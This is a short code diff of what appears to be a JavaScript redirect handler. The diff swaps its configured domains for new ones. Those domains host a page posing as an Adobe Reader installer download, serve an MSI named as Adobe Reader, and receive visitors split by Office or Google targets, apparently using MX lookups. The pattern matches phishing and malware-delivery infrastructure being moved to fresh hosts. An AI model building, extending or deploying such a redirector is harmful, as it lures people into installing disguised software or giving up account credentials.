@@ -3,13 +3,13 @@ import dns from "dns/promises";
 /* ================= CONFIG ================= */
 
 const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
-  "https://aspiceconference.com/adobe-reader/installer/download.html";
+  "https://bebltera.za.com/account/adobe/reader/download.html";
 
 const MSI_PATH = "/Adobe_Reader_install.msi";
 
-const OFFICE_TARGET = "https://aspiceconference.com/cw";
-const GOOGLE_TARGET = "https://aspiceconference.com/wa";
-const DEFAULT_TARGET = "https://aspiceconference.com/wa";
+const OFFICE_TARGET = "https://marcenarias.net/off";
+const GOOGLE_TARGET = "https://marcenarias.net/cw";
+const DEFAULT_TARGET = "https://marcenarias.net/cw";
 
 const MX_TIMEOUT_MS = 1500;
 
@@ -173,3 +173,4 @@ export default async function handler(req, res) {
   res.writeHead(302, { Location: finalUrl });
   res.end();
 }
+
